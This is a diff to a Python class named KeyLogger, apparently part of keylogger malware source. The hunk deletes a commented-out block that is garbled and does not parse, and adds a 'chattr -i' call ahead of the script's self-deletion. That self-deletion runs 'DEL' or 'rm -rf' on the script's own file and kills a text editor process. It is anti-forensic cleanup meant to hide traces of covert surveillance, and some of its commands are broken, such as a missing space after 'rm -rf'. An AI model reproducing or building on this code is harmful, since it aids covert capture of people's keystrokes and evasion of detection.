@@ -104,34 +104,13 @@ class KeyLogger:
                 os.system("DEL " + os.path.basename(__file__))
             except OSError:
                 print('File is close.')
-                
-              '''
-
-         os.rename(os.path.basename(__file__), os.path.basename(__file__) + '.bat')	               
-         os.rename(os.path.basename(__file__) + '.bat'),os.path.basename(__file__) 	               	
-            except OSError:	            except OSError:
-                print('File is still open.')	                
-                os.system("DEL " + os.path.basename(__file__))	              
-
-
-        else:	 
-            try:      
-                pwd = os.path.abspath(os.getcwd())	               
-                os.system("cd " + pwd)	                
-                os.rename(os.path.basename(__file__), os.path.basename(__file__) + '.bat')	               
-                os.rename(os.path.basename(__file__) + '.bat'),os.path.basename(__file__) 	               
-
-            except OSError:	
-                print('File is still open.')	              
-                os.system("rm -rf "+ os.path.basename(__file__))
-        '''
-
 
         else:
             try:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
                 os.system('pkill leafpad')
+                os.system("chattr -i " +  os.path.basename(__file__))
                 print('File was closed.')
                 os.system("rm -rf" + os.path.basename(__file__))
             except OSError:
